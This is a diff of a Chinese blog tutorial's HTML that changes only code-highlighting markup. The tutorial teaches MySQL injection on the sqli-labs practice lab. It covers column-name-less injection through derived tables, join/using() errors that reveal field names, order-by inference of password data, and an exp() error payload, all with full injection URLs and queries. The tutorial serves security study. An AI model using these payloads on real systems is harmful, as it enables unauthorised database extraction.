-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> `<span class="number">3</span>` <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users); </span><br><span class="line">#括号中的语句表示创建的虚拟表</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token punctuation">`</span><span class="token number">3</span><span class="token punctuation">`</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token comment" spellcheck="true">#括号中的语句表示创建的虚拟表</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>理论上这样没有错误，但括号里得到的是一个虚拟表，没有表名，会发生报错，所以我们需要给它起个表名</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> `<span class="number">3</span>` <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)a; <span class="operator">||</span> <span class="keyword">as</span> a</span><br><span class="line">#直接跟a或者<span class="keyword">as</span> a都是起别名的方式，这里a是我们给虚拟表别名</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token punctuation">`</span><span class="token number">3</span><span class="token punctuation">`</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span><span class="token number">a</span><span class="token punctuation">;</span> <span class="token operator">||</span> <span class="token keyword">as</span> <span class="token number">a</span>
+<span class="token comment" spellcheck="true">#直接跟a或者as a都是起别名的方式，这里a是我们给虚拟表别名</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p><img src="image-20210524113358646.png" alt="image-20210524113358646"></p>
 <p><strong>注意：3使用反引号包括，因为在虚拟表中，列名都是1，2，3，所以我们在查询语句中不能直接用 3 。</strong></p>
 <p>有时反引号被过滤，所有可以用另一种方式</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> A <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;A&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)a;</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-sql"><code class="language-sql"> <span class="token keyword">select</span> A <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'A'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span><span class="token number">a</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="image-20210524113744160.png" alt="image-20210524113744160"></p>
 <p>或者给要查询的列也起别名</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> c <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">as</span> a,<span class="number">2</span> <span class="keyword">as</span> b,<span class="number">3</span> <span class="keyword">as</span> c <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)n</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token number">c</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span> <span class="token keyword">as</span> <span class="token number">a</span><span class="token punctuation">,</span><span class="token number">2</span> <span class="token keyword">as</span> <span class="token number">b</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">as</span> <span class="token number">c</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span>n
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="image-20210524114004881.png" alt="image-20210524114004881"></p>
 <h3 id="注入示例"><a href="#注入示例" class="headerlink" title="注入示例"></a>注入示例</h3><blockquote>
 <p>这里以sql-labs-1为例</p>
@@ -914,7 +929,9 @@
 <li>payload</li>
 </ul>
 <blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sql-labs/Less-1/?id=0&#x27; union select 1,2,group_concat(`3`) from (select 1,2 ,3 union select * from security.users)n--+</span></span><br><span class="line"><span class="comment">#联合注入之无列名注入</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1/sql-labs/Less-1/?id=0' union select 1,2,group_concat(`3`) from (select 1,2 ,3 union select * from security.users)n--+</span>
+<span class="token shell-comment comment">#联合注入之无列名注入</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 </blockquote>
 <p>无列名只是把查询真实表改为了查询虚拟表，其他部分差别不大</p>
 <h3 id="无列名时使用join得到字段名"><a href="#无列名时使用join得到字段名" class="headerlink" title="无列名时使用join得到字段名"></a>无列名时使用join得到字段名</h3><ul>
@@ -924,8 +941,8 @@
 <p>  上图是将两表简单相合，是一个无名称的虚拟表</p>
 <p>  当两表中列名存在重复时给虚拟表起别名，便会报错</p>
 <p>  如下</p>
-  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users a <span class="keyword">join</span> emails b)<span class="keyword">as</span> a;</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token number">a</span> <span class="token keyword">join</span> emails <span class="token number">b</span><span class="token punctuation">)</span><span class="token keyword">as</span> <span class="token number">a</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>  先分别查出users和emails的数据，并连接为一个虚拟表，起别名为a，然后查询虚拟表a，这时a表会出现名称重复的字段，数据库报错</p>
 <p>  <img src="image-20210524200514332.png" alt="image-20210524200514332"></p>
 <p>  原理同下</p>
@@ -934,26 +951,27 @@
 </li>
 </ul>
 <h4 id="无列名payload示例"><a href="#无列名payload示例" class="headerlink" title="无列名payload示例"></a>无列名payload示例</h4><blockquote>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#完整<span class="keyword">sql</span>语句</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;0&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">join</span> users b <span class="keyword">using</span>(id))n;</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">#完整sql语句</span>
+<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'0'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">join</span> users <span class="token number">b</span> <span class="token keyword">using</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span>n<span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p><img src="image-20210524201435423.png" alt="image-20210524201435423"></p>
 </blockquote>
 <ul>
 <li><p>详解</p>
-  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;$id&#x27;</span></span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'$id'</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>  这是系统本身的查询语句</p>
-  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27; union select 1,2,3 from (语句体)n;</span></span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">0</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span>语句体<span class="token punctuation">)</span>n<span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>  这里构造了一个典型的联合查询，n为表名，语句体是无列名注入的语句</p>
-  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27; union select 1,2,3 from (select users join users b)n;</span></span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">0</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> users <span class="token keyword">join</span> users <span class="token number">b</span><span class="token punctuation">)</span>n<span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>  括号中语句构造了一个虚拟表，因为是由两个users表使用join语句连接而成，所以必然出现列名重复报错，别名为n便于查询</p>
-  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27; union select 1,2,3 from (select * from users join users a)n;</span></span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">0</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">join</span> users <span class="token number">a</span><span class="token punctuation">)</span>n<span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>  join查询的两个表不能重名，所以要将一个表起别名</p>
-  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27; union select 1,2,3 from (select * from users join users a using(id))n;</span></span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">0</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">join</span> users <span class="token number">a</span> <span class="token keyword">using</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span>n<span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>  using()方法用于join中，规定join两个表连接时字段名相同的列</p>
 <p>  使用using()后，列名不会重复</p>
 <p>  <img src="image-20210525151501090.png" alt="image-20210525151501090"></p>
@@ -964,8 +982,8 @@
 <p>  <strong>using()方法可以解决这个问题</strong></p>
 </li>
 <li><p>注入完整语句</p>
-  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span><span class="keyword">sql</span><span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,2,3 from (select * from users join users b using(id,username))n--+</span></span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//127.0.0.1/sql-labs/Less-1/?id=0' union select 1,2,3 from (select * from users join users b using(id,username))n--+</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>  <img src="image-20210525152003540.png" alt="image-20210525152003540"></p>
 </li>
 </ul>
@@ -975,8 +993,8 @@
 <li>order by 同样可以对虚拟表进行排序</li>
 </ul>
 <h3 id="payload举例"><a href="#payload举例" class="headerlink" title="payload举例"></a>payload举例</h3><blockquote>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span>;</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="image-20210526180009845.png" alt="image-20210526180009845"></p>
 </blockquote>
 <p><strong>目标是得到password的数据，使用union select 1,2,3 时，联合的第三列虚拟数据为3和Dumb,order by 排序时默认升序，所以会将3排在首列，当union select 连接的数据为1,2,”E”时，E比原表的D值更大，于是E排在了Dumb下面</strong></p>
@@ -1126,7 +1144,9 @@
 <p>  <img src="image-20210526204130441.png" alt="image-20210526204130441"></p>
 </li>
 <li><p>payload</p>
-  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a))</span><br></pre></td></tr></table></figure></li>
+<pre class="line-numbers language-sql"><code class="language-sql">exp<span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">a</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
 </ul>
 <p>这里我也不懂，此方法仅限mysql5使用</p>
 <h3 id="函数报错"><a href="#函数报错" class="headerlink" title="函数报错"></a>函数报错</h3><p><strong>最常见的是updatexml()和extractvalue()函数，在注入攻击中已经提及</strong></p>
@@ -1626,6 +1646,8 @@
 
 <!-- 代码语言 -->
 
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
 
 <!-- 代码块复制 -->
 
@@ -1641,6 +1663,29 @@
 code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
 </style>
 
+
+<!-- 代码块功能依赖 -->
+<!-- <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script> -->
+
+<!-- 代码语言 -->
+<!--  -->
+<!-- <script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script> -->
+<!--  -->
+
+<!-- 代码块复制 -->
+<!-- 
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+ -->
+
+<!-- 代码块收缩 -->
+<!--  -->
+
+<!-- 代码块折行 -->
+<!-- 
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+ -->
 
     </div>
     <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
